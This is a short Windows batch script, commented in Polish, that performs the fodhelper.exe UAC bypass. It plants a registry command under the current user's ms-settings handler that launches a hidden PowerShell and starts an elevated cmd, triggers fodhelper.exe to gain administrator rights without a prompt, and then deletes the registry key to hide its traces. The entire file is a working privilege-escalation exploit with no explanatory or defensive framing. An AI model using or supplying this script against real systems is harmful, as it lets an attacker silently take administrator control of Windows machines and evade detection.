@echo off
:: Rejestracja payloadu pod fodhelper
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "powershell -windowstyle hidden -Command Start-Process cmd -Verb runAs" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f

:: Uruchomienie fodhelpera (triger UAC bypassu)
start "" "fodhelper.exe"

:: Krótka pauza
timeout /t 3 >nul

:: Czyszczenie po sobie
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

:: Gotowe
exit
